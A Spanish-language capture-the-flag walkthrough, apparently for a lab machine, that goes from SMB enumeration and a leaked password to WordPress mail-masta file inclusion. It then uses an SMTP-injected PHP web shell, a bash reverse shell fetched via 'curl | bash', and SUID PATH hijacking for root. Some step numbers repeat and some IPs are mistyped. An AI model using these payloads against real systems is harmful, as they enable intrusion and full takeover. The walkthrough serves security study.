1. Escaneo de puertos 
```
nmap -p- --open -n -sSC -vvv --min-rate 4000 -Pn -o scanPorts 192.168.48.144
```
Impresión
```java
Discovered open port 445/tcp on 192.168.48.144
Discovered open port 139/tcp on 192.168.48.144
Discovered open port 25/tcp on 192.168.48.144
Discovered open port 22/tcp on 192.168.48.144
Discovered open port 80/tcp on 192.168.48.144
```

2. Escanear el servicio `smb` que se encuentra abierto
```
smbmap -H 192.168.84.144
```
Impresión 
```java
[+] Guest session   	IP: 192.168.48.144:445	Name: 192.168.48.144                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	helios                                            	NO ACCESS	Helios personal share
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
```

3. El usuario `anonimous` tiene permiso de lectura, observar recursos
```
smbmap -H 192.168.48.144 -r anonymous
```
Impresión 
```java
[+] Guest session   	IP: 192.168.48.144:445	Name: 192.168.48.144                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	anonymous                                         	READ ONLY	
	.\anonymous\*
	dr--r--r--                0 Fri Jun 28 20:14:49 2019	.
	dr--r--r--                0 Fri Jun 28 20:12:15 2019	..
	fr--r--r--              154 Fri Jun 28 20:14:49 2019	attention.txt
```

4. Descargar el archivo `attention.txt`
```
smbmap -H 192.168.48.144 --download anonymous/attention.txt 
```
Impresión
```
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```

5. Probar las contraseñas con el usuario `helios` (Encontrado anteriormente)
```
smbmap -H 192.168.48.144 -u helios -p qwerty
```

6. Observar recursos con nuevo usuario
```
smbmap -H 192.168.48.144 -u helios -p qwerty -r
```
Impresión
```java
[+] IP: 192.168.48.144:445	Name: 192.168.48.144                                    
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	READ ONLY	Printer Drivers
	.\print$\*
	dr--r--r--                0 Fri Jun 28 19:35:16 2019	.
	dr--r--r--                0 Fri Jun 28 19:35:19 2019	..
	dr--r--r--                0 Wed May  8 15:23:36 2019	W32ALPHA
	dr--r--r--                0 Wed May  8 15:23:36 2019	COLOR
	dr--r--r--                0 Wed May  8 15:23:36 2019	W32X86
	dr--r--r--                0 Wed May  8 15:23:36 2019	WIN40
	dr--r--r--                0 Wed May  8 15:23:36 2019	W32PPC
	dr--r--r--                0 Wed May  8 15:23:36 2019	x64
	dr--r--r--                0 Wed May  8 15:23:36 2019	W32MIPS
	dr--r--r--                0 Wed May  8 15:23:36 2019	IA64
	helios                                            	READ ONLY	Helios personal share
	.\helios\*
	dr--r--r--                0 Fri Jun 28 19:32:05 2019	.
	dr--r--r--                0 Fri Jun 28 19:37:04 2019	..
	fr--r--r--              432 Fri Jun 28 19:32:05 2019	research.txt
	fr--r--r--               52 Fri Jun 28 19:32:05 2019	todo.txt
	anonymous                                         	READ ONLY	
	.\anonymous\*
	dr--r--r--                0 Fri Jun 28 20:14:49 2019	.
	dr--r--r--                0 Fri Jun 28 20:12:15 2019	..
	fr--r--r--              154 Fri Jun 28 20:14:49 2019	attention.txt
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian)
```

6. Descargar el recurso 
```
smbmap -H 192.168.48.144 -u helios -p qwerty -r --download helios/todo.txt
```
7. Entrar al directorio encontrado en el archivo
```
http://192.168.48.144/h3l105/
```
8. Buscar los `plugins` que aloja la pagina
```
curl http://192.168.48.144/h3l105/ | grep 'wp-content'
```
Impresión 
```html
<script type='text/javascript' src='http://symfonos.local/h3l105/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.2.2'></script>
<script type='text/javascript' src='http://symfonos.local/h3l105/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.2.2'></script>
<script type='text/javascript' src='http://symfonos.local/h3l105/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.2.2'></script>
```
También con 
```
wpscan --url http://192.168.48.144/h3l105/ -e u,p
```
**NOTA:** El plugin vulnerable es `mail-masta`

9.  Buscar plugin en la pagina de wpscan 
```
https://wpscan.com/plugins/
https://wpscan.com/plugin/mail-masta/
https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44/
```

10. Utilizar el ejemplo encontrado en `https://wpscan.com/vulnerability/5136d5cf-43c7-4d09-bf14-75ff8b77bb44/`
```
http://example.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
Con un ip
```
http://192.168.48.144/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

11. Entrar por el protocolo 25 para enviar data 
```
nc 192.168.18.48.144 25
```
Impresión 
```
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
```

12. Enviar un EMAIL malicioso
```
> MAIL FROM: hola@hola.com
> RCPT TO: helios
> DATA
> <?php system($_GET['cmd'])?>
> .
```
Impresión 
```
250 2.0.0 Ok: queued as 5413F406A6
```

13. Utilizar la consola desde la web
```
http://192.168.48.144/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=whoami
```

14. Conectar la maquina victima con la atacante
Crear un archivo `.html` con una reverse shell
```html
#!/bin/bash
bash -i >& /dev/tcp/192.168.48.162/443 0>&1
```

Levantar un servidor
```
python3 -m http.server 80
```

Colocar en escucha el puerto 443
```
nc -nlvp 443
```

Conectar a la maquina desde la url 
```
http://192.168.48.144/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=curl%20192.168.48.162%20|%20bash
```

12. Hacer un tratamiento de la tty
```
script /dev/null -c bash
ctrl + z
stty raw echo;fg
reset xterm
export SHELL=bash
export XTERM=term
```

13. Buscar archivos con permisos `SUID`
```
find / -perm -4000 -user root 2>/dev/null 
```
Impresión 
```
/opt/statuscheck
```

 14. Observar el archivo 
```
/opt/statuscheck
```
Impresión 
```
HTTP/1.1 200 OK
Date: Tue, 28 May 2024 21:39:16 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Sat, 29 Jun 2019 00:38:05 GMT
ETag: "148-58c6b9bb3bc5b"
Accept-Ranges: bytes
Content-Length: 328
Vary: Accept-Encoding
Content-Type: text/html
```

15. Con `strings` listar las cadenas de caracteres legibles 
```
curl -I H
```

16. Hacer un PATHACKING al `curl`
```
cd /tmp
echo chmod u+s /bin/bash > curl
chmod +x curl
export PATH=/tmp:$PATH
/opt/statuscheck
```

17. Usar una `bash`
```
bash -p 
```
